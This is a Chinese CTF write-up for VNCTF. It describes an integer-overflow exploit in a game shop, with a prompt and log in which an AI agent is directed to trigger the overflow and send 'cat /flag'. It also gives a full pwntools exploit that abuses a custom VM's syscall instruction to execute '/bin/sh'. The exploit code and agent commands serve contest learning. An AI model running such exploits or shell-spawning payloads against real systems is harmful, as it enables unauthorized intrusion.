---
title: VNCTF 部分WP
published: 2026-02-01
description: "待补充复现"
image: ''
tags: [PWN，WP]
category: PWN
draft: false
---

### eat some AI

很简单的一道misc pwn

```c
❯ nc 114.66.24.228 33955
>>> 胜率计算规则 <<<
基础胜率: 30%
属性克制: +40% (具体克制关系请自行查阅 Wiki: https://wiki.biligame.com/nightreign/)
稀有度加成: 稀有+10%, 史诗+20%, 传说+30%
历战王惩罚: -20%
连胜加成: 每连胜一场，下场胜利额外获得 (连胜数 * 100) 积分
====================
=== 艾尔登法环：黑夜君临 (深夜模式) ===
加载存档... 当前深度: 0 (积分: 0/1000000, 当前连胜: 0, 轮数: 1/10)
遭遇 领主: 黑夜化形者 布德奇冥
描述: 在无尽黑夜的前头，模糊不清的人影──那是黑夜的起源，也是世界公敌。引导指出了方向──初始黑夜王，就在足迹的尽头。
你获得了武器: 长剑
描述: 标准的直剑。
造成属性: 物理
稀有度: 普通
预期获得积分: 1500
是否开始战斗？(输入 '战斗' 继续，或其他任意键退出)
战斗
战斗开始...
>>> 胜利！击败了 黑夜化形者 布德奇冥 <<<
获得 1500 基础积分！
达成 1 连胜！额外获得 100 积分！
存档已保存。
```

连接之后，让你输入战斗就输入战斗即可

多打几次之后会触发武器购买

```c
❯ nc 114.66.24.228 33955
>>> 胜率计算规则 <<<
基础胜率: 30%
属性克制: +40% (具体克制关系请自行查阅 Wiki: https://wiki.biligame.com/nightreign/)
稀有度加成: 稀有+10%, 史诗+20%, 传说+30%
历战王惩罚: -20%
连胜加成: 每连胜一场，下场胜利额外获得 (连胜数 * 100) 积分
====================
=== 艾尔登法环：黑夜君临 (深夜模式) ===
加载存档... 当前深度: 0 (积分: 4200/1000000, 当前连胜: 1, 轮数: 5/10)
遭遇 领主: 黑夜之爵 艾德雷
描述: 拥有肥厚嘴颚的黑色庞然大物──歪扭的身体饱含雷电，异形的牙齿则是会咬碎、吞噬眼前的一切。
你获得了武器: 暗月大剑
描述: 卡利亚女王赠予伴侣的月之大剑。
造成属性: 魔力
稀有度: 传说

>>> 阴影中走出一个佝偻的身影 <<<
[流浪商人] 我这里有一些来自交界地的护符，或许能帮你活下来...
1. 红琥珀链坠
2. 黄金树的恩惠
3. 蓝羽七刃剑
4. 米莉森的义手
售价: 3000 积分/个 (效果可叠加)
你要购买几个？(输入 0 离开):
```

这里的漏洞便是整数溢出，我们直接买10000000个

```c
[系统] 总计需要支付: -64771072 积分
[流浪商人] 很好... 拿去吧...
获得护符！胜率大幅提升！
当前剩余积分: 64775272
预期获得积分: 1500
是否开始战斗？(输入 '战斗' 继续，或其他任意键退出)
```

可以看到已经溢出成功了

接下来便是给AI写Prompt，这个直接让AI写，原汤化原食

```c
你是一个漏洞测试专员。请严格按以下逻辑操作，以获取系统 Flag：

1. 【触发整数溢出】
   - 当遇到 [流浪商人] 询问购买数量时，必须输入：10000000
   - (原理：利用整数溢出获取巨额积分)

2. 【维持流程】
   - 遇到任何其他询问（如是否开始战斗），统一回复：战斗
   - 忽略所有装备掉落信息。

3. 【执行 Shell 命令】
   - 当看到 "恭喜你" 或 "完全掌握" 等通关提示，或发现自己处于命令行环境（Shell）时。
   - 此时 Flag 通常位于根目录，请立即发送指令：
     cat /flag

请开始执行。
```

```text
[AI Thought] 我看到游戏显示"你已达完全掌握黑夜卢恩的力量"，根据策略指令，当看到"完全掌握"等通关提示时，应该立即发送 `cat /flag` 命令来获取Flag。

[AI Tool Call] interact_with_game - args: {'input_text': 'cat /flag'}


[AI Action] 向游戏输入: cat /flag
VNCTF{N19h7_rEIgn_MAsTEr_99gg_0ce58b42-7f5f-481b-80c3-a775cfa6caad}

[AI] 分析局势中...

[AI Thought] 我看到游戏直接显示了Flag！看来我已经成功获得了系统的Flag。根据策略指令，我已经完成了所有步骤：

1. 触发整数溢出获取巨额积分
2. 维持流程进行战斗
3. 最终到达了可以查看Flag的状态

游戏输出显示Flag是：`VNCTF{N19h7_rEIgn_MAsTEr_99gg_0ce58b42-7f5f-481b-80c3-a775cfa6caad}`

我已经成功完成了漏洞测试任务。Flag已获取。
```

### vm-syscall

第一次做VM题

```c
// 原 sub_1DAF
void vm_loop() {
    while (1) {
        // 检查 PC 是否越界
        if (cpu->pc > 0x200) break;

        // 取指令
        uint8_t opcode = fetch_byte();

        // 检查指令格式对不对，比如寄存器索引是否 > 3
        if (vm_decode(opcode) == -1) { 
            exit(0); 
        }
        switch (opcode) {
            case 0: // NOP
                puts("Blessed are..."); 
                break;
            case 1: // MOV
                inst_mov();
                break;
            case 2: // 算术指令 (立即数)
                inst_math_imm();
                break;
            case 3: // 算术指令 (寄存器)
                inst_math_reg();
                break;
            case 4: // SYSCALL
                inst_syscall(cpu->reg); 
                break;
            default:
                exit(0);
        }
    }
}
```



先分析一下每个指令集的功能

- case 1: 

  格式`[01] [目标Reg] [源Reg] [子指令]`

  子指令 0x20:reg[dest] = reg[src] (赋值)

  子指令0x30:交换两个寄存器的值

  子指令 0x10: 也是赋值

- case 2: 立即数计算

  格式`[02] [目标Reg] [源Reg] [长度Len] [字节1] [字节2]... [子指令]`

  子指令：

  `0x10`: Add (+)

  `0x20`: Sub (-)

  `0x30`: Mul (*)

  `0x40`: Div (/)

  `0x50`: Shl (<<) 左移

  `0x70`: Xor (^) 异或

- case 3:同2，不过是对寄存器中的值计算

- case 4: syscall



步骤如下

1. 通过异或清空寄存器

2. 调用sys_brk(0)，使得rax返回值为堆地址，将rax中的内容存到rdx中

   rax=12 ， rdi=0

3. 为了让我们能够往堆上写入内容，要通过sys_brk(heapbase+0x1000)拓展一下堆空间

4. 构造read(0, HeapBase, 0x100)写入/bin/sh\x00

5. 最后构造execve(HeapBase, 0, 0)即可

```text
    xor rsi, rsi            ; RSI = 0
    xor rdx, rdx            ; RDX = 0
    xor rdi, rdi            ; RDI = 0
    xor rax, rax            ; RAX = 0

    add rax, 12             ; RAX = 12 (sys_brk)
    syscall                 ; 执行 syscall
                            
    mov rsi, rax           
    lea rdi, [rax + 0x1010] ;

    xor rax, rax            ; RAX = 0
    add rax, 12             ; RAX = 12 (sys_brk)
    syscall                 ; 执行 syscall
    
    ;  sys_read(0, heap_base, 0xff)
    xor rax, rax            ; RAX = 0 (sys_read)
    xor rdi, rdi            ; RDI = 0 (stdin)
    
    xor rdx, rdx            ; RDX = 0
    add rdx, 0xff           ; RDX = 255 (读取长度)
    syscall                 ; 执行 syscall 

    ;sys_execve("/bin/sh", 0, 0)
    xor rax, rax            ; RAX = 0
    add rax, 59             ; RAX = 59 (sys_execve)

    mov rdi, rsi            ; RDI = RSI 

    xor rsi, rsi            ; RSI = 0 (argv = NULL)
    xor rdx, rdx            ; RDX = 0 (envp = NULL)

    syscall                 
```

将上面的汇编通过指令集翻译过来即可

EXP：

```python
from pwn import *

context.binary = './syscall'
context.arch = 'amd64'
context.log_level = 'debug'

# p = process('./syscall')
p=remote("114.66.24.228",32015)


R_RAX = b'\x00' # reg[0]
R_RDI = b'\x01' # reg[1]
R_RSI = b'\x02' # reg[2]
R_RDX = b'\x03' # reg[3]

def inst_mov(src,dest):
    return b'\x01' + dest + src + b'\x20'

def inst_math_imm(dest, src, op, val, val_len=8):
    payload = b'\x02' + dest + src + p8(val_len)
    if val_len == 8:
        payload += p64(val, endian='big')
    elif val_len == 1:
        payload += p8(val)
    payload += p8(op)
    return payload

def inst_math_reg(dest, src1, src2, op):
    return b'\x03' + dest + src1 + src2 + p8(op)

def inst_syscall():
    return b'\x04'

OP_ADD = 0x10
OP_XOR = 0x70

code = b''

code += inst_math_reg(R_RSI, R_RSI, R_RSI, OP_XOR)
code += inst_math_reg(R_RDX, R_RDX, R_RDX, OP_XOR)
code += inst_math_reg(R_RDI, R_RDI, R_RDI, OP_XOR)
code += inst_math_reg(R_RAX, R_RAX, R_RAX, OP_XOR)

code += inst_math_imm(R_RAX, R_RAX, OP_ADD, 12, val_len=1) # RAX = 12
code += inst_syscall() 

code += inst_mov(R_RSI,R_RAX) 

# code += inst_math_imm(R_RDI, R_RAX, OP_ADD, 0x1000, val_len=8)
code += b'\x02\x01\x00\x02\x10\x10\x10'

code += inst_math_reg(R_RAX, R_RAX, R_RAX, OP_XOR)
code += inst_math_imm(R_RAX, R_RAX, OP_ADD, 12, val_len=1)
code += inst_syscall()

code += inst_math_reg(R_RAX, R_RAX, R_RAX, OP_XOR) 

code += inst_math_reg(R_RDI, R_RDI, R_RDI, OP_XOR)

code += inst_math_reg(R_RDX, R_RDX, R_RDX, OP_XOR) 
code += inst_math_imm(R_RDX, R_RDX, OP_ADD, 0xff, val_len=1)

code += inst_syscall()

code += inst_math_reg(R_RAX, R_RAX, R_RAX, OP_XOR)
code += inst_math_imm(R_RAX, R_RAX, OP_ADD, 59, val_len=1)


code += inst_mov(R_RDI, R_RSI)

code += inst_math_reg(R_RSI, R_RSI, R_RSI, OP_XOR)
code += inst_math_reg(R_RDX, R_RDX, R_RDX, OP_XOR)

code += inst_syscall()

p.sendafter("Enter your code:", code)

pause()
p.send(b'/bin/sh\x00')

p.interactive()
```



































